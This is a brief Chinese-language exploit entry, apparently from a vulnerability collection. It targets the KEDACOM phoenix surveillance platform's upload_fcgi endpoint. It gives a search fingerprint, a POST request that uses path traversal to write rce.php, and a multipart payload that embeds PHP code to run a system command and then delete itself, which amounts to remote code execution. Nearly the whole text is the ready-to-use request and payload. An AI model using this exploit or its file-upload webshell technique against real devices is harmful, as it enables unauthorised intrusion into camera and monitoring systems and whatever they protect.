# KEDACOMphoenix监控平台upload_fcgi文件上传致RCE

KEDACOMphoenix ｜ 命令执行 ｜ —
- **指纹**：`app="KEDACOM-phoenix监控平台"`
- **请求**：`POST /pmc-bin/upload_fcgi?uploadDir=../&uploadName=rce.php HTTP/1.1`

**Payload**
```
----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="Filedata": filename="q"
Content-Type: image/jpeg
<?php system("id");unlink(__FILE__);?>
----WebKitFormBoundary1v98KI1jc9w1bG97--
```
- **响应特征**：200